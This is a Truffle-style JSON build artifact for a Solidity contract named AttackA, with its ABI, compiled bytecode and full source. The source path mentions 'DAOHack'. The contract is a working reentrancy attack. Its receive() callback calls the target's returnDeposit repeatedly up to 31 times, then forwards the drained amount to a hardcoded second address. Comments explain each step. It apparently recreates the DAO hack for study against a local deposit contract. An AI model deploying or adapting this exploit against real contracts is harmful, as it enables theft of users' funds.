{
  "contractName": "AttackA",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_deposit",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "bool",
          "name": "_foo",
          "type": "bool"
        }
      ],
      "name": "executeAttack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amountIn",
          "type": "uint256"
        }
      ],
      "name": "sendDeposit",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withDraw",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getAttackAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "getDepositAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161067d38038061067d8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506105e9806100946000396000f3fe60806040526004361061004e5760003560e01c806312b0d4001461025e57806314174f33146102b55780633958fe9e146103085780635f52f3ff1461035b5780639aaa6b4d1461039857610259565b366102595760006101029050601f600154111561018057600060018190555060008060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb73c89ce4735882c9f0f0fe26686c53074e09b0d550836040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b15801561014357600080fd5b505af1158015610157573d6000803e3d6000fd5b505050506040513d602081101561016d57600080fd5b8101908080519060200190929190505050505b600060149054906101000a900460ff161561025657600180600082825401925050819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166318b683fb826040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561021957600080fd5b505af115801561022d573d6000803e3d6000fd5b505050506040513d602081101561024357600080fd5b8101908080519060200190929190505050505b50005b600080fd5b34801561026a57600080fd5b506102736103ef565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156102c157600080fd5b506102ee600480360360208110156102d857600080fd5b8101908080359060200190929190505050610418565b604051808215151515815260200191505060405180910390f35b34801561031457600080fd5b506103416004803603602081101561032b57600080fd5b81019080803590602001909291905050506104d3565b604051808215151515815260200191505060405180910390f35b34801561036757600080fd5b506103966004803603602081101561037e57600080fd5b8101908080351515906020019092919050505061058e565b005b3480156103a457600080fd5b506103ad6105ab565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166318b683fb836040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561048e57600080fd5b505af11580156104a2573d6000803e3d6000fd5b505050506040513d60208110156104b857600080fd5b81019080805190602001909291905050505060019050919050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663767b71bd836040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561054957600080fd5b505af115801561055d573d6000803e3d6000fd5b505050506040513d602081101561057357600080fd5b81019080805190602001909291905050505060019050919050565b80600060146101000a81548160ff02191690831515021790555050565b60003090509056fea2646970667358221220e60063d223e8196b5cd3c5d645c1c233bc562788b4679322c21dcd8a0c3ccb6464736f6c63430006060033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.6;\n\n/*\ninterface Deposit{\n       function returnDeposit(uint256 amountOut) external returns (bool);\n   }\n   */\n// You either have to define an Interface or use Import to import the code if you have it\nimport \"./deposit.sol\";\n\ncontract AttackA{\n    // Need to define a variable of type Deposit\n    Deposit deposit;\n    // variable named after the attack on pearl harbour\n    bool ToraTora;\n    //Global variable mutex to stop recursion\n    uint mutex;\n\n// Now define a constructor function to take the address of the deployed Deposit contract\n    constructor(address payable _deposit) public {\n        deposit = Deposit(_deposit);\n    }\n\n\n// toggle for wether too execute the attack\n    function executeAttack (bool _foo) public {\n        ToraTora = _foo;\n    }\n\n// call deposit contract and deposit some Ether\n    function sendDeposit (uint256 amountIn) public returns (bool){\n        deposit.receiveDeposit(amountIn);\n        return true;\n\n    }\n\n    function withDraw(uint amount) public returns (bool){\n        // call deposit contract to withdraw ether\n        deposit.returnDeposit(amount);\n        return true;\n    }\n\n    function getAttackAddress() public view returns (address ){\n        return address(this);\n    }\n\n    function getDepositAddress() public view returns (address ){\n        return address(deposit);\n    }\n\n    receive() external payable {\n        // call back\n        // So if ToraTora is true Attack by calling returnDeposit again\n        // if (mutex check how many times its been called attacker seems to have used 30, check whether to attack, \n        // otherwise any msg to this contract will cause it to attack)\n        uint256 amount = 258;\n        // So this line stops the attack after 31 iterations\n        // You need too reset the ToraTora variable, so that the attack can continue \n        if (mutex > 31){\n            // reset mutex\n            mutex = 0;\n            // set Attack flag back to false\n             ToraTora = false;\n            // Transfer balance to the other attack account attackB\n\n             deposit.transfer(address(0xC89Ce4735882C9F0f0FE26686c53074E09B0D550),amount);\n             }\n        if (ToraTora) \n        {\n            mutex += 1;\n            deposit.returnDeposit(amount);\n            \n        }\n    \n  }\n    \n}\n",
  "sourcePath": "/Users/Pookie/Documents/Work/DAOHack/contracts/attackA.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.6+commit.6c089d02.Emscripten.clang"
  },
  "schemaVersion": "3.3.1",
  "updatedAt": "2020-12-16T16:49:43.509Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}